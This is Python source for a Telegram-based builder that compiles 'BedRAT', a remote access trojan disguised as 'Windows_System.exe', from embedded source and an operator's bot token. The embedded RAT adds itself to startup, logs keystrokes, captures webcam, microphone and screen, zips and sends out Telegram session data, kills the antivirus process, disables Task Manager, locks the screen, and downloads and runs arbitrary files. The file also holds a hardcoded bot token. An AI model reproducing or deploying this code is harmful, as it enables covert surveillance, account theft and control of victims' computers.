import os
import sys
import requests
import subprocess
import telebot
from telebot import types
import threading
import tempfile
import shutil
import time

# Глобальные переменные
TOKEN = '8288578730:AAG23NOdx5z9zJoY2DlPRpWGt4nvPwdeSTI'  # Токен билдера
bot = telebot.TeleBot(TOKEN)
build_in_progress = False

# Полный код BedRAT v1.0.0 со всеми функциями
BEDRAT_CODE = '''
import os
import subprocess
import pyautogui
import psutil
import ctypes
from PIL import ImageGrab
import telebot
from telebot import types
import tempfile
import re
import threading
import tkinter as tk
from tkinter import messagebox
import cv2
import sounddevice as sd
import soundfile as sf
from pynput import keyboard
import shutil
import win32clipboard
import requests
from cryptography.fernet import Fernet
import time
import win32con
import win32api
import getpass
import sys
import zipfile

# Токен будет заменен при сборке
BOT_TOKEN = "{token}"
bot = telebot.TeleBot(BOT_TOKEN)
winlocker_active = False
lock_window = None
log = ""
keyboard_listener = None
encryption_key = Fernet.generate_key()
cipher_suite = Fernet(encryption_key)
chat_id = None

# Автозагрузка
def add_to_startup():
    """Добавляет бота в автозагрузку"""
    try:
        current_file = os.path.abspath(sys.argv[0])
        startup_path = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        bat_path = os.path.join(startup_path, "Windows_System.bat")
        
        with open(bat_path, "w") as bat_file:
            bat_file.write(f'@echo off\\nstart "" "{current_file}"\\n')
        return True
    except Exception as e:
        return False

# Блокировка диспетчера задач
def block_task_manager(block=True):
    """Блокирует диспетчер задач"""
    try:
        if block:
            subprocess.run(["reg", "add", "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System", "/v", "DisableTaskMgr", "/t", "REG_DWORD", "/d", "1", "/f"], shell=True)
            subprocess.run(["taskkill", "/f", "/im", "taskmgr.exe"], shell=True)
        else:
            subprocess.run(["reg", "delete", "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System", "/v", "DisableTaskMgr", "/f"], shell=True)
        return True
    except:
        return False

# Создание клавиатуры
def create_main_keyboard():
    keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [
        "🖥️ Инфо о ПК", "📸 Скриншот", "📷 Фото с камеры", "📋 Процессы",
        "📄 Полный отчет", "❌ Завершить процесс", "📁 Создать папку", "🗑️ Удалить папку",
        "📂 Содержание директории", "📌 Переместиться", "💬 Окно с сообщением", "🎥 Запись с камеры",
        "🎙️ Запись аудио", "⌨️ Кейлогер", "📄 Открыть файл", "⬆️ Загрузить файл",
        "🚀 Загрузить и открыть", "⬇️ Скачать файл", "🗑️ Удалить файл", "🔐 Зашифровать файл", 
        "🔓 Расшифровать файл", "🔚 ALT+F4", "🪟 Свернуть все окна", "📋 Буфер обмена", 
        "✏️ Изменить буфер", "🖥️ Запись экрана", "🕵️‍♂️ Стиллер", "🧩 Закрыть диспетчер", 
        "🔒 Заблокировать диспетчер", "🔓 Разблокировать диспетчер", "🔗 Открыть ссылку", 
        "🔊 Включить звук", "🔇 Выключить звук", "📢 Звук на 100%", "💣 CMD бомба", 
        "📴 Выключить ПК", "🔄 Перезагрузить ПК", "🔀 Переместить файл", "🖼️ Сменить обои", 
        "📦 Скачать папку", "🧾 Команды в Cmd", "🛡️ Антивирус", "🔒 Заблокировать Windows", 
        "🔓 Разблокировать Windows", "ℹ️ Помощь"
    ]
    for i in range(0, len(buttons), 2):
        if i + 1 < len(buttons):
            keyboard.add(types.KeyboardButton(buttons[i]), types.KeyboardButton(buttons[i+1]))
        else:
            keyboard.add(types.KeyboardButton(buttons[i]))
    return keyboard

# Винлокер
def create_lock_window():
    global lock_window
    def check_password():
        if password_entry.get() == "123":
            try:
                lock_window.quit()
                lock_window.destroy()
            except:
                pass
            deactivate_winlocker()
        else:
            messagebox.showerror("Ошибка", "Неверный пароль!")
    
    lock_window = tk.Tk()
    lock_window.title("Windows Заблокирован")
    lock_window.configure(bg="black")
    lock_window.attributes("-fullscreen", True)
    lock_window.attributes("-topmost", True)
    lock_window.overrideredirect(True)
    
    main_frame = tk.Frame(lock_window, bg="black")
    main_frame.pack(expand=True, fill="both")
    
    title_label = tk.Label(main_frame, text="🔒 ВАШ WINDOWS ЗАБЛОКИРОВАН", font=("Arial", 24, "bold"), fg="red", bg="black")
    title_label.pack(pady=30)
    
    password_frame = tk.Frame(main_frame, bg="black")
    password_frame.pack(pady=20)
    
    password_entry = tk.Entry(password_frame, show="*", font=("Arial", 14), width=20)
    password_entry.pack(pady=10)
    password_entry.focus()
    
    unlock_btn = tk.Button(main_frame, text="РАЗБЛОКИРОВАТЬ", command=check_password, font=("Arial", 14), bg="green", fg="white")
    unlock_btn.pack(pady=10)
    
    lock_window.bind("<Return>", lambda event: check_password())
    lock_window.mainloop()

def activate_winlocker():
    global winlocker_active
    winlocker_active = True
    block_task_manager(True)
    threading.Thread(target=create_lock_window, daemon=True).start()

def deactivate_winlocker():
    global winlocker_active, lock_window
    winlocker_active = False
    block_task_manager(False)
    if lock_window:
        try:
            lock_window.quit()
            lock_window.destroy()
        except:
            pass

# Стиллер данных
def steal_data():
    stolen_data = []
    zip_filename = None
    try:
        # Поиск tdata Telegram
        telegram_paths = [
            os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Telegram Desktop", "tdata"),
        ]
        for tdata_path in telegram_paths:
            if os.path.exists(tdata_path):
                zip_filename = "tdata_backup.zip"
                with zipfile.ZipFile(zip_filename, "w", zipfile.ZIP_DEFLATED) as zipf:
                    for root, dirs, files in os.walk(tdata_path):
                        for file in files:
                            file_path = os.path.join(root, file)
                            if os.path.getsize(file_path) < 10 * 1024 * 1024:
                                arcname = os.path.relpath(file_path, tdata_path)
                                zipf.write(file_path, arcname)
                stolen_data.append("📁 Найдена папка tdata")
                
        # Поиск файлов с паролями
        password_files = []
        search_paths = [os.environ["USERPROFILE"], os.path.join(os.environ["USERPROFILE"], "Desktop")]
        for search_path in search_paths:
            if os.path.exists(search_path):
                for root, dirs, files in os.walk(search_path):
                    for file in files:
                        if file.endswith(".txt"):
                            full_path = os.path.join(root, file)
                            password_files.append(full_path)
        
        if password_files:
            stolen_data.append(f"📄 Найдено txt файлов: {len(password_files)}")
            
    except Exception as e:
        stolen_data.append(f"❌ Ошибка: {str(e)}")
    return stolen_data, zip_filename

# Кейлоггер
def start_keylogger_with_timer(duration):
    global log, keyboard_listener
    def on_press(key):
        global log
        try:
            log += str(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                log += " "
            elif key == keyboard.Key.enter:
                log += "\\\\n"
            else:
                log += f" [{str(key)}] "
    
    def stop_logger():
        if keyboard_listener:
            keyboard_listener.stop()
    
    keyboard_listener = keyboard.Listener(on_press=on_press)
    keyboard_listener.start()
    threading.Timer(duration, stop_logger).start()

# Фото с камеры
def take_camera_photo():
    try:
        cap = cv2.VideoCapture(0)
        if cap.isOpened():
            ret, frame = cap.read()
            if ret:
                cv2.imwrite("camera_photo.jpg", frame)
                cap.release()
                return True
        cap.release()
        return False
    except:
        return False

# Запись аудио
def record_audio(duration=10):
    try:
        fs = 44100
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
        sd.wait()
        sf.write("recording.wav", recording, fs)
        return True
    except:
        return False

# Запись экрана
def record_screen(duration=5):
    try:
        frames = []
        for _ in range(duration * 10):
            img = pyautogui.screenshot()
            frames.append(img)
            time.sleep(0.1)
        frames[0].save("screen_record.gif", save_all=True, append_images=frames[1:], duration=100, loop=0)
        return True
    except:
        return False

# Шифрование файлов
def encrypt_file(file_path):
    try:
        with open(file_path, "rb") as file:
            file_data = file.read()
        encrypted_data = cipher_suite.encrypt(file_data)
        with open(file_path + ".encrypted", "wb") as file:
            file.write(encrypted_data)
        return True
    except:
        return False

def decrypt_file(file_path):
    try:
        with open(file_path, "rb") as file:
            encrypted_data = file.read()
        decrypted_data = cipher_suite.decrypt(encrypted_data)
        with open(file_path.replace(".encrypted", "_decrypted"), "wb") as file:
            file.write(decrypted_data)
        return True
    except:
        return False

# Функция для сообщения поверх всех окон
def show_message_with_sound(text):
    try:
        ctypes.windll.user32.MessageBeep(0x00000040)
        root = tk.Tk()
        root.title("Сообщение")
        root.attributes("-topmost", True)
        root.configure(bg="white")
        window_width = 400
        window_height = 200
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        x = (screen_width - window_width) // 2
        y = (screen_height - window_height) // 2
        root.geometry(f"{window_width}x{window_height}+{x}+{y}")
        text_label = tk.Label(root, text=text, font=("Arial", 12), bg="white", wraplength=350, justify="center")
        text_label.pack(expand=True, padx=20, pady=20)
        ok_button = tk.Button(root, text="OK", command=root.destroy, font=("Arial", 10), width=10)
        ok_button.pack(pady=10)
        root.mainloop()
        return True
    except:
        try:
            ctypes.windll.user32.MessageBoxW(0, text, "Сообщение", 0x00000040)
            return True
        except:
            return False

# НОВАЯ ФУНКЦИЯ: Загрузить и открыть файл
def download_and_open_file(file_path, filename):
    """Загружает файл и сразу открывает его"""
    try:
        # Сохраняем файл
        with open(filename, "wb") as new_file:
            new_file.write(file_path)
        
        # Пытаемся открыть файл
        os.startfile(filename)
        return True
    except Exception as e:
        return False

# Обработчики команд
@bot.message_handler(commands=["start"])
def send_welcome(message):
    global chat_id
    chat_id = message.chat.id
    add_to_startup()
    computer_name = os.environ.get("COMPUTERNAME", "Неизвестный ПК")
    user_name = os.environ.get("USERNAME", "Неизвестный пользователь")
    welcome_text = f"🖥️ ПК подключен /start\\\\n💻 Имя: {computer_name}\\\\n👤 Пользователь: {user_name}\\\\n⏰ Время: {time.strftime('%Y-%m-%d %H:%M:%S')}"
    bot.reply_to(message, welcome_text, reply_markup=create_main_keyboard())

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    global chat_id
    chat_id = message.chat.id
    text = message.text
    
    if text == "🖥️ Инфо о ПК":
        try:
            computer_name = os.environ.get("COMPUTERNAME", "N/A")
            user_name = os.environ.get("USERNAME", "N/A")
            info = f"💻 Информация о ПК:\\\\nКомпьютер: {computer_name}\\\\nПользователь: {user_name}\\\\nПроцессор: {os.cpu_count()} ядер\\\\nПамять: {psutil.virtual_memory().total / (1024**3):.1f} GB"
            bot.reply_to(message, info, reply_markup=create_main_keyboard())
        except: pass
        
    elif text == "📸 Скриншот":
        try:
            screenshot_img = ImageGrab.grab()
            screenshot_img.save("screenshot.png")
            with open("screenshot.png", "rb") as photo:
                bot.send_photo(message.chat.id, photo)
            bot.reply_to(message, "✅ Скриншот сделан", reply_markup=create_main_keyboard())
        except: pass
        
    elif text == "📷 Фото с камеры":
        try:
            if take_camera_photo():
                with open("camera_photo.jpg", "rb") as photo:
                    bot.send_photo(message.chat.id, photo)
                bot.reply_to(message, "✅ Фото с камеры сделано", reply_markup=create_main_keyboard())
            else:
                bot.reply_to(message, "❌ Не удалось сделать фото", reply_markup=create_main_keyboard())
        except: pass
        
    elif text == "📋 Процессы":
        try:
            processes = []
            for proc in psutil.process_iter(["pid", "name"]):
                processes.append(f"{proc.info['pid']}: {proc.info['name']}")
            response = "\\\\n".join(processes[:10])
            bot.reply_to(message, f"📋 Процессы:\\\\n{response}", reply_markup=create_main_keyboard())
        except: pass
        
    elif text == "📄 Полный отчет":
        try:
            report = []
            for proc in psutil.process_iter(["pid", "name"]):
                report.append(f"{proc.info['pid']}: {proc.info['name']}")
            with open("report.txt", "w", encoding="utf-8") as f:
                f.write("\\\\n".join(report[:20]))
            with open("report.txt", "rb") as f:
                bot.send_document(message.chat.id, f)
            bot.reply_to(message, "✅ Отчет отправлен", reply_markup=create_main_keyboard())
        except: pass
        
    elif text == "❌ Завершить процесс":
        try:
            msg = bot.reply_to(message, "Введите PID процесса:", reply_markup=types.ReplyKeyboardRemove())
            bot.register_next_step_handler(msg, process_kill_process)
        except: pass
        
    elif text == "📁 Создать папку":
        try:
            msg = bot.reply_to(message, "Введите путь папки:", reply_markup=types.ReplyKeyboardRemove())
            bot.register_next_step_handler(msg, process_mkdir)
        except: pass
        
    elif text == "💬 Окно с сообщением":
        try:
            msg = bot.reply_to(message, "Введите текст сообщения:", reply_markup=types.ReplyKeyboardRemove())
            bot.register_next_step_handler(msg, process_popup)
        except: pass
        
    elif text == "⬆️ Загрузить файл":
        try:
            msg = bot.reply_to(message, "Отправьте файл:", reply_markup=types.ReplyKeyboardRemove())
            bot.register_next_step_handler(msg, process_upload_file)
        except: pass
        
    # НОВАЯ КНОПКА: Загрузить и открыть файл
    elif text == "🚀 Загрузить и открыть":
        try:
            msg = bot.reply_to(message, "📥 Отправьте файл для загрузки и открытия:", reply_markup=types.ReplyKeyboardRemove())
            bot.register_next_step_handler(msg, process_download_and_open)
        except: pass
        
    elif text == "⬇️ Скачать файл":
        try:
            msg = bot.reply_to(message, "Введите путь файла:", reply_markup=types.ReplyKeyboardRemove())
            bot.register_next_step_handler(msg, process_download_file)
        except: pass
        
    elif text == "🕵️‍♂️ Стиллер":
        try:
            data, zip_filename = steal_data()
            if zip_filename and os.path.exists(zip_filename):
                with open(zip_filename, "rb") as f:
                    bot.send_document(message.chat.id, f, caption="📁 Архив tdata")
                os.remove(zip_filename)
                bot.reply_to(message, "✅ Данные отправлены", reply_markup=create_main_keyboard())
            else:
                bot.reply_to(message, "❌ Данные не найдены", reply_markup=create_main_keyboard())
        except: pass
        
    elif text == "⌨️ Кейлогер":
        try:
            msg = bot.reply_to(message, "Введите длительность в секундах:", reply_markup=types.ReplyKeyboardRemove())
            bot.register_next_step_handler(msg, process_keylogger_duration)
        except: pass
        
    elif text == "🔒 Заблокировать Windows":
        activate_winlocker()
        bot.reply_to(message, "🔒 Windows заблокирован!", reply_markup=create_main_keyboard())
        
    elif text == "🔓 Разблокировать Windows":
        deactivate_winlocker()
        bot.reply_to(message, "🔓 Windows разблокирован!", reply_markup=create_main_keyboard())
        
    elif text == "🛡️ Антивирус":
        try:
            subprocess.run(["taskkill", "/f", "/im", "MsMpEng.exe"], shell=True)
            bot.reply_to(message, "✅ Антивирус отключен", reply_markup=create_main_keyboard())
        except: pass
        
    elif text == "📴 Выключить ПК":
        try:
            os.system("shutdown /s /t 5")
            bot.reply_to(message, "✅ Выключение через 5 секунд", reply_markup=create_main_keyboard())
        except: pass
        
    elif text == "🔄 Перезагрузить ПК":
        try:
            os.system("shutdown /r /t 5")
            bot.reply_to(message, "✅ Перезагрузка через 5 секунд", reply_markup=create_main_keyboard())
        except: pass
        
    elif text == "🔗 Открыть ссылку":
        try:
            msg = bot.reply_to(message, "Введите URL:", reply_markup=types.ReplyKeyboardRemove())
            bot.register_next_step_handler(msg, process_open_url)
        except: pass
        
    elif text == "💣 CMD бомба":
        try:
            for _ in range(5):
                os.system("start cmd")
            bot.reply_to(message, "✅ CMD бомба запущена", reply_markup=create_main_keyboard())
        except: pass
        
    elif text == "🔊 Включить звук":
        try:
            for _ in range(10):
                pyautogui.press("volumeup")
            bot.reply_to(message, "✅ Звук включен", reply_markup=create_main_keyboard())
        except: pass
        
    elif text == "ℹ️ Помощь":
        help_text = "🤖 BedRAT v1.0.0 - Используйте кнопки для управления ПК"
        bot.reply_to(message, help_text, reply_markup=create_main_keyboard())

# Функции обработки
def process_kill_process(message):
    try:
        if message.text and message.text.strip().isdigit():
            pid = int(message.text.strip())
            os.kill(pid, 9)
            bot.reply_to(message, f"✅ Процесс {pid} завершен", reply_markup=create_main_keyboard())
        else:
            bot.reply_to(message, "❌ Введите корректный PID", reply_markup=create_main_keyboard())
    except: pass

def process_mkdir(message):
    try:
        if message.text:
            path = message.text.strip()
            os.makedirs(path, exist_ok=True)
            bot.reply_to(message, f"✅ Папка создана: {path}", reply_markup=create_main_keyboard())
        else:
            bot.reply_to(message, "❌ Введите путь", reply_markup=create_main_keyboard())
    except: pass

def process_popup(message):
    try:
        if message.text:
            text = message.text.strip()
            if show_message_with_sound(text):
                bot.reply_to(message, "✅ Сообщение показано", reply_markup=create_main_keyboard())
            else:
                bot.reply_to(message, "❌ Ошибка показа сообщения", reply_markup=create_main_keyboard())
        else:
            bot.reply_to(message, "❌ Введите текст", reply_markup=create_main_keyboard())
    except: pass

def process_upload_file(message):
    try:
        if message.document:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            filename = message.document.file_name
            with open(filename, "wb") as new_file:
                new_file.write(downloaded_file)
            bot.reply_to(message, f"✅ Файл загружен: {filename}", reply_markup=create_main_keyboard())
        else:
            bot.reply_to(message, "❌ Отправьте файл", reply_markup=create_main_keyboard())
    except: pass

# НОВАЯ ФУНКЦИЯ: Обработка загрузки и открытия файла
def process_download_and_open(message):
    try:
        if message.document:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            filename = message.document.file_name
            
            # Сохраняем и открываем файл
            if download_and_open_file(downloaded_file, filename):
                bot.reply_to(message, f"✅ Файл загружен и открыт: {filename}", reply_markup=create_main_keyboard())
            else:
                bot.reply_to(message, f"✅ Файл загружен, но не удалось открыть: {filename}", reply_markup=create_main_keyboard())
        else:
            bot.reply_to(message, "❌ Отправьте файл", reply_markup=create_main_keyboard())
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {str(e)}", reply_markup=create_main_keyboard())

def process_download_file(message):
    try:
        if message.text:
            path = message.text.strip()
            if os.path.exists(path):
                with open(path, "rb") as file:
                    bot.send_document(message.chat.id, file)
                bot.reply_to(message, f"✅ Файл отправлен: {path}", reply_markup=create_main_keyboard())
            else:
                bot.reply_to(message, "❌ Файл не найден", reply_markup=create_main_keyboard())
        else:
            bot.reply_to(message, "❌ Введите путь", reply_markup=create_main_keyboard())
    except: pass

def process_keylogger_duration(message):
    try:
        if message.text and message.text.strip().isdigit():
            duration = int(message.text.strip())
            start_keylogger_with_timer(duration)
            bot.reply_to(message, f"✅ Кейлоггер запущен на {duration} секунд", reply_markup=create_main_keyboard())
            
            def send_log():
                time.sleep(duration + 2)
                if log:
                    with open("keylog.txt", "w", encoding="utf-8") as f:
                        f.write(log)
                    with open("keylog.txt", "rb") as f:
                        bot.send_document(chat_id, f, caption=f"⌨️ Лог за {duration} секунд")
            
            threading.Thread(target=send_log, daemon=True).start()
        else:
            bot.reply_to(message, "❌ Введите число", reply_markup=create_main_keyboard())
    except: pass

def process_open_url(message):
    try:
        if message.text:
            url = message.text.strip()
            os.system(f"start {url}")
            bot.reply_to(message, f"✅ Ссылка открыта: {url}", reply_markup=create_main_keyboard())
        else:
            bot.reply_to(message, "❌ Введите URL", reply_markup=create_main_keyboard())
    except: pass

if __name__ == "__main__":
    print("🤖 BedRAT v1.0.0 запущен...")
    while True:
        try:
            bot.polling(none_stop=True)
        except:
            time.sleep(10)
'''

def create_bedrat_exe(token, output_path):
    """Создает exe файл BedRAT с указанным токеном"""
    try:
        # Создаем временную папку для сборки
        with tempfile.TemporaryDirectory() as temp_dir:
            # Заменяем токен в коде
            bedrat_code = BEDRAT_CODE.replace('{token}', token)
            
            # Сохраняем код в файл
            script_path = os.path.join(temp_dir, 'bedrat.py')
            with open(script_path, 'w', encoding='utf-8') as f:
                f.write(bedrat_code)
            
            # Устанавливаем pyinstaller если не установлен
            try:
                import PyInstaller
            except ImportError:
                print("📦 Установка PyInstaller...")
                subprocess.run([sys.executable, '-m', 'pip', 'install', 'pyinstaller'], 
                             capture_output=True, text=True)
            
            # Упрощенный spec файл для избежания ошибок
            spec_content = f'''
# -*- mode: python ; coding: utf-8 -*-

block_cipher = None

a = Analysis(
    ['{script_path}'],
    pathex=[],
    binaries=[],
    datas=[],
    hiddenimports=[
        'telebot', 'pyautogui', 'psutil', 'PIL', 'cv2', 
        'sounddevice', 'soundfile', 'pynput.keyboard', 'win32clipboard',
        'cryptography.fernet', 'zipfile'
    ],
    hookspath=[],
    hooksconfig={{}},
    runtime_hooks=[],
    excludes=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    [],
    exclude_binaries=True,
    name='Windows_System',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
)
'''
            
            spec_path = os.path.join(temp_dir, 'bedrat.spec')
            with open(spec_path, 'w', encoding='utf-8') as f:
                f.write(spec_content)
            
            # Компилируем в exe с таймаутом
            print("🔨 Компиляция BedRAT v1.0.0...")
            
            # Используем упрощенную команду PyInstaller
            result = subprocess.run([
                'pyinstaller',
                '--onefile',
                '--noconsole',
                '--clean',
                script_path
            ], cwd=temp_dir, capture_output=True, text=True, timeout=300)  # 5 минут таймаут
            
            if result.returncode == 0:
                # Ищем скомпилированный файл
                dist_path = os.path.join(temp_dir, 'dist')
                for file in os.listdir(dist_path):
                    if file.endswith('.exe'):
                        exe_path = os.path.join(dist_path, file)
                        shutil.copy2(exe_path, output_path)
                        return True
                
                print("❌ EXE файл не найден в dist папке")
                return False
            else:
                print(f"❌ Ошибка компиляции: {result.stderr}")
                return False
                
    except subprocess.TimeoutExpired:
        print("❌ Таймаут компиляции (5 минут)")
        return False
    except Exception as e:
        print(f"❌ Ошибка сборки: {e}")
        return False

@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = """
🤖 **BedRAT Builder v1.0.0**

**Создайте своего бота управления ПК за 3 шага:**

1. 🆕 Создайте бота через @BotFather
2. 🔑 Получите API токен
3. 🛠️ Отправьте токен для сборки

📋 **ВСЕ ФУНКЦИИ BedRAT v1.0.0:**
• 🖥️ Информация о ПК
• 📸 Скриншоты и фото с камеры  
• 📋 Управление процессами
• 🔒 Блокировка Windows (винлокер)
• 🕵️‍♂️ Стиллер данных (tdata Telegram)
• ⌨️ Кейлоггер с таймером
• 🛡️ Отключение антивируса
• 📁 Полный файловый менеджер
• 🚀 **НОВАЯ: Загрузить и открыть файл**
• 💬 Сообщения поверх всех окон
• 🎥 Запись экрана и аудио
• 🔐 Шифрование файлов
• 🔗 Управление ссылками
• 🔊 Управление звуком
• 💣 CMD бомба
• ⚡ Автозагрузка
• 🔄 Перезагрузка/выключение ПК

🚀 **Отправьте API токен бота для начала сборки:**
    """
    bot.reply_to(message, welcome_text)

@bot.message_handler(func=lambda message: True)
def handle_token_input(message):
    global build_in_progress
    
    if build_in_progress:
        bot.reply_to(message, "⏳ Идет сборка предыдущего бота...")
        return
        
    token = message.text.strip()
    
    # Проверяем формат токена
    if not token.replace(':', '').replace('_', '').replace('-', '').isalnum() or len(token) < 20:
        bot.reply_to(message, "❌ Неверный формат токена! Токен должен содержать цифры, буквы и двоеточие")
        return
    
    build_in_progress = True
    
    try:
        # Проверяем токен
        bot.reply_to(message, "🔍 Проверка токена...")
        test_bot = telebot.TeleBot(token)
        bot_info = test_bot.get_me()
        
        if not bot_info:
            bot.reply_to(message, "❌ Неверный токен! Бот не найден.")
            build_in_progress = False
            return
            
        bot.reply_to(message, f"✅ Токен проверен! Бот: @{bot_info.username}")
        
        # Начинаем сборку
        progress_msg = bot.reply_to(message, "🔨 Начинаю сборку BedRAT v1.0.0...")
        
        # Создаем имя файла
        output_filename = f"Windows_System_{bot_info.username}.exe"
        output_path = os.path.join(os.getcwd(), output_filename)
        
        # Обновляем статус
        bot.edit_message_text("🔄 Компиляция в EXE... (это займет 2-5 минут)", message.chat.id, progress_msg.message_id)
        
        # Собираем exe
        if create_bedrat_exe(token, output_path):
            # Отправляем файл
            with open(output_path, 'rb') as exe_file:
                bot.send_document(
                    message.chat.id,
                    exe_file,
                    caption=f"✅ **BedRAT v1.0.0 Успешно собран!**\\n\\n"
                           f"🤖 Бот: @{bot_info.username}\\n"
                           f"📦 Файл: {output_filename}\\n"
                           f"🕒 Время: {time.strftime('%Y-%m-%d %H:%M:%S')}\\n\\n"
                           f"🚀 **Инструкция:**\\n"
                           f"1. Запустите файл на целевом ПК\\n"
                           f"2. Напишите /start вашему боту\\n"
                           f"3. Используйте кнопки для управления\\n\\n"
                           f"⚡ **BedRAT автоматически добавится в автозагрузку!**"
                )
            
            # Удаляем временный файл
            try:
                os.remove(output_path)
            except:
                pass
                
            bot.edit_message_text("✅ Сборка завершена успешно!", message.chat.id, progress_msg.message_id)
                
        else:
            bot.edit_message_text("❌ Ошибка сборки! Попробуйте другой токен или проверьте интернет соединение.", message.chat.id, progress_msg.message_id)
            
    except Exception as e:
        error_msg = f"❌ Ошибка: {str(e)}"
        bot.reply_to(message, error_msg)
        
    finally:
        build_in_progress = False

def run_bot():
    """Запускает бота с перезапуском при ошибках"""
    while True:
        try:
            print("🤖 BedRAT Builder запущен...")
            bot.polling(none_stop=True, timeout=60)
        except Exception as e:
            print(f"❌ Ошибка: {e}")
            time.sleep(10)

if __name__ == "__main__":
    print("🚀 Запуск BedRAT Builder v1.0.0")
    print("📞 Бот готов принимать токены для сборки")
    run_bot()